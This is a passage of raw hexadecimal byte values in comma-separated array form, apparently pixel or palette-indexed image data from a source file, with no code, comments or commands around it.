0xE5, 0xE5, 0xE5, 0xE6, 0xE6, 0xE4, 0x08, 0x14, 0xE5, 0x14, 0x08, 0x08, 0x14, 0xE2, 0xE2, 0xE2,
0xE2, 0xE3, 0xE3, 0xE3, 0xE3, 0xE3, 0xE2, 0xE1, 0xE2, 0xE2, 0xE2, 0xE0, 0xC9, 0xE0, 0xE0, 0xC9,
0xC9, 0xE0, 0xE1, 0x81, 0x98, 0x98, 0x98, 0x98, 0x99, 0x99, 0x16, 0x17, 0x18, 0x07, 0x50, 0x19,
0x18, 0x17, 0x18, 0x17, 0x80, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0x12, 0x11, 0x12, 0xC9, 0xC9,
0xE2, 0x13, 0xE0, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0xC9, 0xE0, 0xE0, 0xE2, 0x14, 0x14, 0xC9, 0xC9,
0xE3, 0x08, 0x17, 0x17, 0x17, 0x17, 0x08, 0x08, 0x08, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x08,
0x08, 0x08, 0x08, 0x08, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14,
0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14,
0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14,
0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14,
0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x81, 0x81, 0x81, 0x97, 0x97, 0x97,
0x97, 0x80, 0x97, 0x80, 0x97, 0xAF, 0xAE, 0xAF, 0xAF, 0xAF, 0xAF, 0xAE, 0xAE, 0xAE, 0xAE, 0xAE,
0xAE, 0xAF, 0xAF, 0x9A, 0x98, 0x81, 0xE1, 0xC9, 0xE0, 0xC9, 0xC9, 0xE0, 0xE2, 0x98, 0x16, 0x17,
0x18, 0x18, 0x9A, 0x80, 0xC8, 0xC8, 0xB1, 0xB1, 0x11, 0xC8, 0x14, 0xE2, 0xC8, 0x12, 0x12, 0x08,
0x16, 0x08, 0x14, 0x13, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x11, 0x11, 0x12, 0x12, 0xC9, 0xE1, 0xE2, 0xE1, 0xC9, 0xC9, 0xC9, 0xC9, 0x12, 0xC9,
0xE1, 0x14, 0x08, 0x99, 0x9C, 0x9B, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08,
0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x14, 0x08, 0x08, 0x14, 0x08, 0x08, 0x08, 0x08,
0x08, 0x14, 0x08, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14,
0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14,
0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14,
0x14, 0x14, 0x14, 0x14, 0xE4, 0xE1, 0xC9, 0xC8, 0xC8, 0xE0, 0x97, 0x98, 0x98, 0x96, 0x96, 0x96,
0x96, 0x96, 0x96, 0x96, 0x96, 0x96, 0x95, 0x95, 0x95, 0x95, 0x95, 0x95, 0x95, 0x95, 0x95, 0x95,
0x95, 0x95, 0x96, 0x81, 0x81, 0xE3, 0xCA, 0xC9, 0x81, 0x98, 0xE3, 0xC8, 0xC8, 0xC8, 0xC9, 0xC9,
0xC8, 0xC8, 0x11, 0x12, 0xC8, 0x12, 0x11, 0x11, 0x11, 0xE1, 0x99, 0x99, 0xE3, 0x12, 0x08, 0x16,
0x08, 0x08, 0x16, 0x08, 0x14, 0xE4, 0x13, 0x13, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12,
0x12, 0x12, 0x12, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC9, 0xC9, 0xC9, 0xC9, 0xC9, 0xC9, 0xC9, 0xC9,
0xC9, 0xC9, 0xC9, 0xE0, 0xE1, 0xE2, 0x14, 0xE3, 0xE2, 0xE1, 0xE0, 0xC9, 0xC9, 0xCA, 0xC9, 0x12,
0x12, 0xC9, 0xC9, 0xC9, 0xE4, 0x08, 0x08, 0x9A, 0x9A, 0x9A, 0x9A, 0x08, 0x08, 0x08, 0x08, 0x08,
0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08,
0x08, 0x08, 0x08, 0x08, 0x08, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14,
0x08, 0x08, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14,
0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0xE3,
0xE1, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0xB1, 0xC8, 0x80, 0x96, 0x96, 0x96, 0x95,
0x96, 0x95, 0x95, 0x96, 0x96, 0x96, 0x96, 0x95, 0x95, 0x95, 0x95, 0x95, 0x95, 0x95, 0x95, 0x95,
0x95, 0x95, 0x95, 0x1B, 0x07, 0x1B, 0x1B, 0x1B, 0x1B, 0x1B, 0x07, 0x07, 0x07, 0x07, 0x07, 0x19,
0x19, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x18, 0x17, 0x17, 0x17, 0x17, 0x9C, 0x17, 0x18, 0x18,
0x18, 0x17, 0x16, 0x16, 0x16, 0x08, 0x08, 0x08, 0x14, 0xE3, 0x13, 0x13, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC9, 0xDF, 0xC9, 0xE0, 0xE0, 0xE0, 0xE0, 0xE0, 0xE0, 0xE1,
0xF6, 0xE2, 0x14, 0x14, 0x97, 0x97, 0x81, 0x81, 0x98, 0x98, 0x98, 0x14, 0x14, 0x14, 0xE3, 0xE2,
0xE2, 0xE2, 0xE3, 0xE3, 0xE3, 0xE2, 0xE1, 0xE0, 0xE0, 0xC9, 0xE0, 0xE0, 0xE0, 0xC9, 0xCA, 0xC9,
0x12, 0x12, 0xC9, 0x14, 0x08, 0x9C, 0x9C, 0x9A, 0x08, 0x08, 0x08, 0x9B, 0x9C, 0x9B, 0x9A, 0x08,
0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08,
0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08,
0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14,
0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0xE4, 0xE4, 0xE2, 0x13, 0x12, 0x12, 0x12,
0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0xC7, 0xC7, 0xDF, 0x97, 0x95, 0x95,
0x95, 0x96, 0x96, 0x95, 0x94, 0x95, 0x95, 0x95, 0x95, 0x95, 0x94, 0x94, 0x95, 0x95, 0x94, 0x94,
0x94, 0x94, 0x94, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x07, 0x18, 0x9C, 0x08, 0x14, 0xE3, 0xE3, 0xE2,
0xE2, 0xE1, 0xE1, 0xE0, 0xE0, 0xE0, 0xE0, 0xE0, 0xC9, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xDF, 0xE0, 0xE0, 0xF7, 0xF6, 0xF6, 0xF6, 0xF5, 0xF5,
0xF5, 0x80, 0x80, 0x80, 0x97, 0x97, 0x97, 0x97, 0x97, 0x80, 0x80, 0x80, 0x80, 0x97, 0x97, 0x97,
0x97, 0x97, 0x81, 0x98, 0x98, 0x98, 0x98, 0x98, 0x99, 0x98, 0x98, 0x81, 0x14, 0x14, 0xE2, 0xE2,
0xE2, 0xE3, 0x08, 0x14, 0xCA, 0xCA, 0xE2, 0xC9, 0xC9, 0xE0, 0xE2, 0xE1, 0xE1, 0xE2, 0x14, 0x08,
0x99, 0x17, 0x18, 0x18, 0x17, 0x17, 0x17, 0x17, 0x9B, 0x99, 0x08, 0x08, 0x08, 0x9A, 0x9B, 0x9A,
0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08,
0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08,
0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x08, 0x08, 0x08,
0x14, 0x14, 0x08, 0x14, 0x14, 0x14, 0x14, 0xE4, 0xE2, 0xE2, 0x14, 0xE3, 0x12, 0x12, 0xC9, 0xC9,
0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0xC6, 0xC6, 0xDF, 0x97,
0x95, 0x95, 0x95, 0x95, 0x95, 0x95, 0x94, 0x95, 0x95, 0x95, 0x95, 0x94, 0x94, 0x94, 0x94, 0x94,
0x94, 0x94, 0x94, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C,
0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D,
0x1D, 0x1D, 0x1D, 0x1E, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1B, 0x18, 0x16, 0x08, 0x14,
0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x08, 0x14, 0x14, 0x14, 0xE2, 0xE1, 0xE0, 0xC9, 0xC8,
0xC8, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12, 0xC8,
0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0xDF, 0xDF, 0xDF, 0xDF, 0xDF, 0xE0, 0xE0, 0xE0, 0xE0, 0xE1,
0xF6, 0xE1, 0xE1, 0xE2, 0x80, 0x80, 0x80, 0x80, 0x80, 0x80, 0x80, 0x80, 0x80, 0x80, 0x80, 0x80,
0x80, 0x80, 0x80, 0x80, 0x80, 0x97, 0x97, 0x97, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98,
0x97, 0x97, 0x97, 0x97, 0x97, 0x97, 0x97, 0x97, 0x97, 0x97, 0x97, 0x97, 0x97, 0x97, 0x97, 0x97,
0x97, 0x97, 0x97, 0x81, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x14, 0x14, 0xE3, 0xE3, 0xE3, 0x14,
0x98, 0x98, 0x98, 0x14, 0xE2, 0xE2, 0xE3, 0xE1, 0xC9, 0xC9, 0xE2, 0x14, 0x14, 0x14, 0xE3, 0xE3,
0x14, 0x14, 0x9A, 0x16, 0x17, 0x17, 0x17, 0x17, 0x17, 0x9B, 0x9A, 0x08, 0x14, 0x14, 0x08, 0x9A,
0x9A, 0x08, 0x14, 0x14, 0x08, 0x9A, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9A, 0x08, 0x08, 0x08,
0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08,
0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08,
0x08, 0x08, 0x08, 0x08, 0x14, 0xE4, 0xE2, 0xCA, 0xCA, 0xE2, 0x14, 0x14, 0xC9, 0x12, 0xC9, 0xE0,
0xC8, 0x12, 0x12, 0x12, 0x11, 0x11, 0x11, 0x11, 0x12, 0x12, 0x12, 0x12, 0xC6, 0xC6, 0xC7, 0xC6,
0xDE, 0x97, 0x95, 0x95, 0xAD, 0x94, 0x94, 0x94, 0x94, 0x94, 0x94, 0x95, 0x94, 0x94, 0xAC, 0xAC,
0xAC, 0xAC, 0xAC, 0x1D, 0x1D, 0x1C, 0x1C, 0x1C, 0x1D, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C,
0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1B, 0x18, 0x9A,
0x08, 0x08, 0x08, 0x08, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x14, 0x14, 0x14, 0x14,
0xE2, 0xE1, 0xE0, 0xC9, 0xDF, 0xC8, 0xC8, 0xC8, 0xC8, 0xC8, 0x12, 0x12, 0x12, 0x12, 0x12, 0x12,
0x12, 0x12, 0xC9, 0xE0, 0xC9, 0xC8, 0xC9, 0xC9, 0xC9, 0xDF, 0xDF, 0xDF, 0xE0, 0xE0, 0xE0, 0xE0,
0xE0, 0xE0, 0xE2, 0x14, 0x14, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98,
0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98,
0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x81, 0x81, 0x97, 0x81, 0x81, 0x81, 0x81, 0x97, 0x97, 0x97,
0x97, 0x97, 0x97, 0x97, 0x81, 0x98, 0x98, 0x98, 0xAF, 0xAF, 0xAF, 0xAF, 0xAF, 0xAF, 0x98, 0x98,
0x98, 0x98, 0x98, 0x81, 0x97, 0x97, 0x97, 0x97, 0x97, 0x97, 0x97, 0x97, 0x97, 0x97, 0x81, 0x98,
0x98, 0x98, 0x98, 0x98, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0xE3, 0x14, 0x14, 0x14, 0x08,
0x99, 0x99, 0x14, 0x14, 0x08, 0x98, 0x99, 0x9A, 0x98, 0x14, 0x9A, 0x17, 0x18, 0x17, 0x9A, 0x08,
0x14, 0x14, 0x14, 0xE3, 0xE1, 0xCA, 0xE3, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x9B,
0x17, 0x9A, 0x9A, 0x08, 0x14, 0xE3, 0xE4, 0x14, 0x08, 0x9E, 0x9F, 0x9F, 0x9E, 0x9E, 0x9E, 0x9E,
0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9F, 0x9F,
0x08, 0x9F, 0x9F, 0x9F, 0x9F, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08,
0x08, 0x08, 0x08, 0x14, 0xE3, 0xE0, 0xC9, 0xC9, 0xC9, 0xE0, 0xE1, 0x81, 0x80, 0xC8, 0xC8, 0xC8,
0xC8, 0xC8, 0xF7, 0xF4, 0x97, 0xF4, 0x14, 0x14, 0xF6, 0xDF, 0xC8, 0xC8, 0xC6, 0xC6, 0xC7, 0xC6,
0xC7, 0xC6, 0xDF, 0x96, 0xAC, 0xAC, 0xAC, 0xAC, 0x94, 0x94, 0xAC, 0xAC, 0x94, 0x94, 0xAC, 0x94,
0x94, 0xAC, 0xAC, 0x1D, 0x1D, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1D, 0x1D,
0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D,
0x1D, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1D, 0x1D, 0x1B,
0x18, 0x9B, 0x99, 0x08, 0x99, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x14, 0x14, 0x14, 0x14,
0x14, 0x14, 0xF5, 0xF6, 0xE1, 0xF7, 0xE0, 0xE0, 0xE0, 0xF7, 0xF7, 0xDF, 0xDF, 0xDF, 0xDF, 0xDF,
0xE0, 0xE0, 0xF6, 0xF5, 0x14, 0xE0, 0xE0, 0xF6, 0xF6, 0xF7, 0xF6, 0xF6, 0xF6, 0xE2, 0xF6, 0xF6,
0xE1, 0xE2, 0x14, 0x98, 0x98, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99,
0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x9A, 0xAE, 0xAE, 0xAE, 0xAE,
0xAE, 0xAE, 0x99, 0xAF, 0xAF, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x81, 0x81, 0x81, 0x97, 0x97,
0x97, 0x97, 0x81, 0x98, 0x98, 0x98, 0x98, 0x98, 0xAF, 0xAF, 0xAF, 0xAF, 0xAF, 0xAF, 0xAF, 0x98,
0x98, 0x98, 0x98, 0x97, 0x97, 0x97, 0x97, 0x97, 0x97, 0x97, 0x97, 0x81, 0x81, 0x98, 0x98, 0x98,
0x98, 0x98, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x14, 0x08, 0x08, 0x08,
0x08, 0x08, 0x14, 0xE2, 0xE0, 0xC9, 0xC9, 0x12, 0xC8, 0xC8, 0xC9, 0xE2, 0x14, 0x99, 0x17, 0x18,
0x18, 0x18, 0x17, 0x9B, 0x99, 0x14, 0xE2, 0xE3, 0xE2, 0xCA, 0xC9, 0xCA, 0xE2, 0xE3, 0xE4, 0x14,
0x99, 0x17, 0x17, 0x9A, 0x14, 0x14, 0xE4, 0xCD, 0xCE, 0x08, 0x9C, 0x9D, 0x9F, 0x08, 0x9F, 0x9F,
0x9F, 0x9E, 0x9E, 0x9F, 0x9F, 0x9F, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x9E, 0x08,
0x9E, 0x9E, 0x9E, 0x9E, 0x9F, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08, 0x08,
0x08, 0x08, 0x14, 0xE3, 0xE0, 0xC9, 0xDF, 0xDF, 0xE0, 0xE0, 0xF6, 0xF6, 0xF6, 0xF6, 0xF7, 0xDF,
0xC8, 0xC6, 0xC8, 0xDE, 0xF6, 0xF5, 0x97, 0x96, 0x96, 0x97, 0xF6, 0xDF, 0xC6, 0xC6, 0xC6, 0xC6,
0xC6, 0xC6, 0xC6, 0xC6, 0xDE, 0x95, 0x19, 0x4E, 0x4E, 0x4E, 0x4F, 0x19, 0x19, 0x19, 0x19, 0x19,
0x18, 0x18, 0x18, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1C, 0x1D, 0x1C, 0x1C, 0x1C, 0x1C,
0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D, 0x1E, 0x1E, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1B, 0x1C,
0x1D, 0x1D, 0x1D, 0x1D, 0x1D, 0x1C, 0x1C, 0x1B, 0x1B, 0x1C, 0x1C, 0x1C, 0x1D, 0x1D, 0x1D, 0x1D,
0x1D, 0x1C, 0x19, 0x17, 0x9A, 0x99, 0x99, 0x99, 0x98, 0x98, 0x98, 0x08, 0x14, 0x14, 0x14, 0x14,
0x14, 0x14, 0xF5, 0xF6, 0xF7, 0xF7, 0xF7, 0xE0, 0xE0, 0xDF, 0xDF, 0xF7, 0xF6, 0xF6, 0xE2, 0xF6,
0xE0, 0xDF, 0xE0, 0xF7, 0xF6, 0xF6, 0xF7, 0xF7, 0xF7, 0xF6, 0xF6, 0xF7, 0xE0, 0xF7, 0xE0, 0xF7,
0xF6, 0x97, 0x81, 0x98, 0x98, 0x99, 0x99, 0x99, 0x99, 0x99, 0x9A, 0x9A, 0x9A, 0x9A, 0x99, 0x99,
0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0x99, 0xAF, 0x99, 0x99, 0x99,
0x99, 0xAF, 0xAF, 0x98, 0x98, 0x98, 0x98, 0x81, 0x97, 0x97, 0x97, 0x97, 0x81, 0x81, 0x81, 0x81,
0x97, 0x97, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0xAF, 0xAF, 0xAF, 0x99, 0xAE, 0xAE, 0xAF, 0xAF,
0xAF, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x98, 0x81, 0x81, 0x81, 0x81, 0x14, 0x98, 0x98,
0x98, 0x99, 0x99, 0x9A, 0x16, 0x16, 0x08, 0xE0, 0x12, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11,
0x11, 0x12, 0x13, 0xE4, 0x08, 0x08, 0x08, 0xE4, 0xE3, 0x13, 0xCA, 0xCA, 0x13, 0x12, 0x12, 0x12,
